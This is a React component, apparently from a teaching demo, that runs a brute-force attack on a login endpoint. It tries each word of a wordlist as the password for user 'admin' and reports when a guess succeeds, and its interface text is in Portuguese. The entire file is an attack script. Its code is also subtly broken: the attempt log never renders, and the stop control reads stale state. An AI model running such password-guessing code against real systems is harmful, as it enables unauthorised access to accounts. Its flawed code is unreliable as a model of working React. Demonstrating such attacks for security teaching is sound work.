import React, { useState } from "react";
import wordlist from '../data/wordList';
import myfetch from "../lib/myfetch";

export default function BruteForce() {
    const [log, setLog] = useState([]);
    const [stop, setStop] = useState(true);

    async function handleStartClick() {
        setStop(false);

        for (let i in wordlist) {
            try {
                const logCopy = [...log];
                logCopy.unshift({
                    num: i,
                    text: `Tentativa nº ${i} => ${wordlist[i]}`
                })
                setLog(logCopy);

                await myfetch.post('/users/login', {
                    username: 'admin',
                    password: wordlist[i]
                });

                alert('Senha encontrada: ' + wordlist[i])
                break
            } catch (error) {
                console.log(error);
            }
            if (stop) break
        }
    }

    return (
        <>
            <h1>Ataque de força bruta no <em>login</em></h1>
            <div style={{
                display: 'flex',
                justifyContent: 'space-around'
            }}>
                <button onClick={handleStartClick} disabled={!stop}>
                    Iniciar
                </button>
                <button onClick={() => setStop(true)} disabled={stop}>
                    Parar
                </button>
                <select size={8}>
                    {
                        log.map((row) => {
                            <option key={row.num} value={row.text}>{row.text}</option>
                        })
                    }
                </select>
            </div>
        </>
    )
}